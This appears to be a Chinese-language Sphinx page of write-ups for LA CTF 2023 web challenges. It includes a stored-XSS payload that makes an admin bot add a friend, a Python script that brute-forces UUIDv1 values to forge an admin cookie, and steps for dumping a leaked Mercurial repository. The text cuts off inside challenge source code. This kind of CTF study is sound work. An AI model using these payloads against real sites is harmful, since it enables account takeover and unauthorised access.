@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>LA CTF &mdash; CTF 0.0 documentation</title>
+      <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js?v=44496db0"></script>
+        <script src="../../_static/doctools.js?v=888ff710"></script>
+        <script src="../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            CTF
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">CTF</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="Lexington-Informatics-Tournament.html">Lexington Informatics Tournament CTF 2023</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">CTF</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">LA CTF</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/source/2023/la-ctf.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="la-ctf">
+<h1>LA CTF<a class="headerlink" href="#la-ctf" title="Permalink to this heading"></a></h1>
+<section id="web">
+<h2>WEB<a class="headerlink" href="#web" title="Permalink to this heading"></a></h2>
+<section id="college-tour">
+<h3>college-tour<a class="headerlink" href="#college-tour" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.</p>
+<p><strong>题目分析</strong></p>
+<p>签到题，flag 被分成多处藏在各个页面中，根据字符前的数字确定各个子 flag 的顺序。</p>
+<ol class="arabic simple">
+<li><p>HTML comment</p>
+<ul class="simple">
+<li><p>j03_4</p></li>
+</ul>
+</li>
+<li><p>image alt text</p>
+<ul class="simple">
+<li><p>nd_j0</p></li>
+</ul>
+</li>
+<li><p>css unused class font-family</p>
+<ul class="simple">
+<li><p>S3phI</p></li>
+</ul>
+</li>
+<li><p>PDF name</p>
+<ul class="simple">
+<li><p>n3_bR</p></li>
+</ul>
+</li>
+<li><p>cookie value</p>
+<ul class="simple">
+<li><p>U1n_s</p></li>
+</ul>
+</li>
+<li><p>javascript code that is never executed</p>
+<ul class="simple">
+<li><p>AY_hi</p></li>
+</ul>
+</li>
+</ol>
+</section>
+<section id="metaverse">
+<h3>metaverse<a class="headerlink" href="#metaverse" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you’re good to metago.</p>
+<p>metaverse.lac.tf</p>
+<p>You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!</p>
+<p><strong>题目分析</strong></p>
+<p>又是经典的 express 框架，这里给出文档地址 <a class="reference external" href="http://expressjs.com/en/5x/api.html#app.use">express 文档</a></p>
+<p>在经过一次漫长的审计之后，总算有点头绪。 在路由 <code class="docutils literal notranslate"><span class="pre">/friends</span></code> 中会以当前用户名为 key 查询 accounts，这就得到了当前用户的账户信息。随后会返回该账户的 friends 信息，包括 username 和 displayName。</p>
+<p>所以现在的想法就是让管理员成为我们的朋友，然后直接访问以上路由就可以看到 flag。</p>
+<p>添加朋友的路由在 post 的 <code class="docutils literal notranslate"><span class="pre">/friend</span></code>。这里会 post 一个 username，这个参数表示你想要添加的朋友的名字，代码会判断 username 的朋友中是否有 res.locals.user，如果没有就添加。但是关键的问题是我们要添加 admin 为我们的朋友，但以上代码我们只能把自己加为自己的朋友，比如我们向这个路由传入 username=admin，这会导致管理员将我们加为朋友，但是在我们的 friends 数组中依旧是没有管理员的。</p>
+<p>所以我们应该要通过某种方式来让管理员访问这个路由，然后把我们加为好友，最终我们自己去访问 get 的 <code class="docutils literal notranslate"><span class="pre">/friends</span></code> 路由就可以看到 flag。</p>
+<p>那如何让管理员把我们加为好友呢？审计源码发现是存在一个 XSS 漏洞的，我们可以通过这个漏洞来做到这一点。</p>
+<p>在题目页面有一个发表 metaposts 的方框，审计页面源代码可以发现点击页面的 new metapost 按钮会触发以上的函数，从而向后端的 /post 路由提交一个 post 请求。</p>
+<p>/post 路由对应的函数会返回一个随机的 id，并把我们提交的内容和这个 id 关联起来。</p>
+<p>然后根据页面源码的 <strong>window.open(“/post/” + t);</strong> 语句我们会跳转到以下路由函数</p>
+<p>这里是直接用上一步返回的 id 所关联的内容作为渲染变量传入模板，并直接输出给我们。所以这里存在一个明显的存储型 XSS 漏洞。所以我们在方框提交一个 XSS payload，让管理员加我们为好友即可。</p>
+<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span>&lt;script&gt;
+fetch(&#39;/friend&#39;,{
+	method:&#39;POST&#39;,
+	headers:{
+		&quot;Content-type&quot;:&#39;application/x-www-form-urlencoded&#39;
+	},
+	body:&#39;username=123&#39;
+})
+&lt;/script&gt;
+</pre></div>
+</div>
+<p>提交之后会得到一个 url 链接，直接去题目给的 admin-bot 那里提交，然后管理员就会访问存在 XSS 漏洞的网页并执行我们的 js 代码，最后我们在自己的网页访问 /friends 就可以看到 flag 了。</p>
+</section>
+<section id="uuid-hell">
+<h3>uuid hell<a class="headerlink" href="#uuid-hell" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>UUIDs are the best! I love them (if you couldn’t tell)!</p>
+<p>Site: uuid-hell.lac.tf</p>
+<p><strong>题目分析</strong></p>
+<p>整体逻辑很简单，就是从 Cookie 处获取 id，如果是管理员 id 就发送 flag。</p>
+<p>getUser() 函数会输出 管理员和普通用户的 uuid 哈希值，createadmin() 函数可以创建一个管理员 uuid。</p>
+<p>获取 flag 的思路如下：</p>
+<ol class="arabic simple">
+<li><p>访问 createadmin() 创建管理员 uuid</p></li>
+<li><p>访问根页面查看上一步创建的管理员 uuid 的哈希值</p></li>
+<li><p>尝试伪造第一步创建的管理员 uuid，将伪造结果进行哈希签名并于第二步得到的哈希值比较，若相同，则说明伪造成功。</p></li>
+</ol>
+<blockquote>
+<div><p>由于时间戳的问题，现在似乎无法复现。</p>
+</div></blockquote>
+<p>所以这其实是一个暴力破解 uuid-1 的题目，相关知识点在 https://versprite.com/blog/universally-unique-identifiers/</p>
+<blockquote>
+<div><p>当然如果你觉得英文难以阅读，可以直接看我写的分析。</p>
+</div></blockquote>
+<blockquote>
+<div><p>觉得我写的不好的可以看看国外师傅的</p>
+<ul class="simple">
+<li><p>https://rluo.dev/writeups/web/lactf-web-uuid-hell</p></li>
+<li><p>https://siunam321.github.io/ctf/LA-CTF-2023/Web/uuid-hell/</p></li>
+</ul>
+</div></blockquote>
+<p>当然，以下 wp 的思路是更加巧妙的。访问一次主页创建一个 uuid，然后访问 /flag 创建一个 管理员 uuid，之后再次访问主页创建一个 uuid。 所以 /flag 处创建的 uuid 其时间戳必定位于 两次主页的 uuid 之间。</p>
+<p>我们笃定这三个 uuid 对应的时间戳只在 time_low 部分有不同，因为相隔的时间特别短暂。</p>
+<p><img alt="" src="source/.gitbook/assets/image.png" /></p>
+<p>12小时的磕磕绊绊，终归是完全靠自己写出来了这个题。下面是我写的exp，有模有样嗷！！</p>
+<p><strong>exp</strong></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">uuid</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+
+<span class="k">def</span> <span class="nf">getUUIDAndHash</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
+
+    <span class="n">uuidPattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&quot;[0-9a-f]</span><span class="si">{8}</span><span class="s2">-[0-9a-f]</span><span class="si">{4}</span><span class="s2">-[0-9a-f]</span><span class="si">{4}</span><span class="s2">-[0-9a-f]</span><span class="si">{4}</span><span class="s2">-[0-9a-f]</span><span class="si">{12}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">hashPattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&quot;[0-9a-f]</span><span class="si">{32}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">hashTable</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;strong&gt;&quot;</span><span class="p">)</span> <span class="c1"># 表中第一项是uuid而非哈希</span>
+   
+    <span class="n">uuid</span> <span class="o">=</span> <span class="n">uuidPattern</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">hashTable</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">adminHash</span> <span class="o">=</span> <span class="n">hashPattern</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">hashTable</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">uuid</span><span class="p">,</span><span class="n">adminHash</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">crack</span><span class="p">(</span><span class="n">uuid1</span><span class="p">,</span><span class="n">uuid2</span><span class="p">,</span><span class="nb">hash</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;uuid1=&#39;</span><span class="p">,</span><span class="n">uuid1</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;uuid2=&quot;</span><span class="p">,</span><span class="n">uuid2</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;hash=&quot;</span><span class="p">,</span><span class="nb">hash</span><span class="p">)</span>
+    <span class="n">uuid1</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">uuid1</span><span class="p">)</span><span class="o">.</span><span class="n">fields</span>
+    <span class="n">uuid2</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">uuid2</span><span class="p">)</span><span class="o">.</span><span class="n">fields</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">uuid1</span><span class="p">,</span><span class="n">uuid2</span><span class="p">)</span>
+
+    <span class="n">start</span><span class="p">,</span><span class="n">end</span> <span class="o">=</span> <span class="n">uuid1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">uuid2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">while</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">end</span> <span class="p">:</span>
+        <span class="n">tmp</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">fields</span><span class="o">=</span><span class="p">(</span><span class="n">start</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">uuid1</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">uuid1</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">uuid1</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="n">uuid1</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="n">uuid1</span><span class="p">[</span><span class="mi">5</span><span class="p">]))</span>
+        <span class="n">tmpHash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;admin&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">tmpHash</span> <span class="o">==</span> <span class="nb">hash</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;目标UUID=&quot;</span><span class="p">,</span><span class="n">tmp</span><span class="p">)</span>
+            <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+            <span class="k">break</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+     <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+     <span class="n">uuid1</span><span class="p">,</span><span class="n">x</span> <span class="o">=</span> <span class="n">getUUIDAndHash</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+     <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;/createadmin&quot;</span><span class="p">)</span>
+     <span class="n">r1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+     <span class="n">uuid2</span><span class="p">,</span><span class="n">adminHash</span> <span class="o">=</span> <span class="n">getUUIDAndHash</span><span class="p">(</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+     <span class="n">targetUUID</span> <span class="o">=</span> <span class="n">crack</span><span class="p">(</span><span class="n">uuid1</span><span class="p">,</span><span class="n">uuid2</span><span class="p">,</span><span class="n">adminHash</span><span class="p">)</span>
+     <span class="k">return</span> <span class="n">targetUUID</span>
+     
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://47.115.222.18:3500&quot;</span>
+    <span class="n">targetUUID</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;id&quot;</span> <span class="p">:</span> <span class="n">targetUUID</span><span class="p">})</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+</div>
+</section>
+<section id="my-chemical-romance">
+<h3>my-chemical-romance<a class="headerlink" href="#my-chemical-romance" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>When I was… a young boy… I made a “My Chemical Romance” fanpage!</p>
+<p>my-chemical-romance.lac.tf</p>
+<p><strong>题目分析</strong></p>
+<p>打开页面是毫无头绪的，无输入点、无上传点，这时候就需要抓包看看：</p>
+<p>很明显响应头有个奇怪的字段：Source-Control-Management-Type: Mercurial-SCM</p>
+<p>谷歌一下：<a class="reference external" href="https://zh.wikipedia.org/wiki/Mercurial">Mercurial - 维基百科，自由的百科全书 (wikipedia.org)</a></p>
+<blockquote>
+<div><p>SCM 是 Source Control Management 的缩写</p>
+</div></blockquote>
+<p>好的，这是一个跨平台的分布式版本控制软件，这不免让我们想到 git，而 CTF 中 git 常用于 git 泄露，所以是否有 Mercurial 泄露呢？</p>
+<p>~~答案是有的，所以我们可以从服务器下载文件。这里直接用官方给出的<a class="reference external" href="https://github.com/p0dalirius/mercurial-scm-extract">工具</a>，随后的操作就是和 git 泄露常见考点一样，恢复之前的 commit 啥的。~~</p>
+<p>记录一下简单的做法：</p>
+<ol class="arabic simple">
+<li><p>下载安装hg即调用命令<code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">apt</span> <span class="pre">install</span> <span class="pre">mecurial</span></code>。</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">hg</span> <span class="pre">clone</span> <span class="pre">题目地址</span></code>。</p></li>
+<li><p>调用<code class="docutils literal notranslate"><span class="pre">hg</span> <span class="pre">log</span></code> 查看日志，发现两个版本的变更。</p></li>
+<li><p>调用<code class="docutils literal notranslate"><span class="pre">hg</span> <span class="pre">diff</span> <span class="pre">--from</span> <span class="pre">0</span> <span class="pre">--to</span> <span class="pre">1</span></code>命令获得flag。</p></li>
+</ol>
+<blockquote>
+<div><p>复杂的做法可以参看：<a class="reference external" href="https://siunam321.github.io/ctf/LA-CTF-2023/Web/my-chemical-romance/">my-chemical-romance | Siunam’s Website (siunam321.github.io)</a></p>
+</div></blockquote>
+</section>
+<section id="reasons-why">
+<h3>85_reasons_why<a class="headerlink" href="#reasons-why" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>If you wanna catch up on ALL the campus news, check out my new blog. It even has a reverse image search feature!</p>
+<p>85-reasons-why.lac.tf</p>
+<p><strong>init.py</strong></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
+<span class="kn">from</span> <span class="nn">flask_sqlalchemy</span> <span class="kn">import</span> <span class="n">SQLAlchemy</span>
+
+<span class="kn">from</span> <span class="nn">dotenv</span> <span class="kn">import</span> <span class="n">load_dotenv</span>
+
+<span class="n">load_dotenv</span><span class="p">()</span>
+
+<span class="n">basedir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;sqlite:///&#39;</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">basedir</span><span class="p">,</span> <span class="s1">&#39;app.db&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;?mode=ro&#39;</span>
+
+<span class="n">db</span> <span class="o">=</span> <span class="n">SQLAlchemy</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+<span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">views</span>
+
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">from_object</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>
+    <span class="n">db</span><span class="o">.</span><span class="n">create_all</span><span class="p">()</span>
+
+
+</pre></div>
+</div>
+<p><strong>models.py</strong></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">db</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+
+<span class="kn">import</span> <span class="nn">uuid</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+
+<span class="k">class</span> <span class="nc">Post</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
+    <span class="n">__tablename__</span> <span class="o">=</span> <span class="s1">&#39;posts&#39;</span>
+
+    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">36</span><span class="p">),</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">title</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">200</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">author</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">200</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">date</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">active</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Boolean</span><span class="p">(),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">images</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">relationship</span><span class="p">(</span><span class="s2">&quot;Image&quot;</span><span class="p">,</span> <span class="n">backref</span><span class="o">=</span><span class="s2">&quot;post&quot;</span><span class="p">,</span> <span class="n">uselist</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">comments</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">relationship</span><span class="p">(</span><span class="s2">&quot;Comment&quot;</span><span class="p">,</span> <span class="n">backref</span><span class="o">=</span><span class="s2">&quot;post&quot;</span><span class="p">,</span> <span class="n">uselist</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">author</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">title</span> <span class="o">=</span> <span class="n">title</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">content</span> <span class="o">=</span> <span class="n">content</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">author</span> <span class="o">=</span> <span class="n">author</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">date</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&quot;%m-</span><span class="si">%d</span><span class="s2">-%Y, %H:%M:%S&quot;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">active</span> <span class="o">=</span> <span class="kc">True</span>
+
+
+<span class="k">class</span> <span class="nc">Comment</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
+    <span class="n">__tablename__</span> <span class="o">=</span> <span class="s1">&#39;comments&#39;</span>
+
+    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">36</span><span class="p">),</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">author</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">144</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">comment</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">144</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">parent</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="n">db</span><span class="o">.</span><span class="n">ForeignKey</span><span class="p">(</span><span class="s2">&quot;posts.id&quot;</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">comment</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">author</span> <span class="o">=</span> <span class="n">author</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">comment</span> <span class="o">=</span> <span class="n">comment</span>
+
+    <span class="k">def</span> <span class="fm">__repr__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;&lt;Comment </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">comment</span><span class="si">}</span><span class="s1">&gt;&#39;</span>
+
+
+<span class="k">class</span> <span class="nc">Image</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
+    <span class="n">__tablename__</span> <span class="o">=</span> <span class="s1">&#39;images&#39;</span>
+
+    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">36</span><span class="p">),</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">b85_image</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">1000000</span><span class="p">))</span>
+    <span class="n">parent</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="n">db</span><span class="o">.</span><span class="n">ForeignKey</span><span class="p">(</span><span class="s2">&quot;posts.id&quot;</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">b85_image</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">b85_image</span> <span class="o">=</span> <span class="n">b85_image</span>
+    
+    <span class="k">def</span> <span class="fm">__repr__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
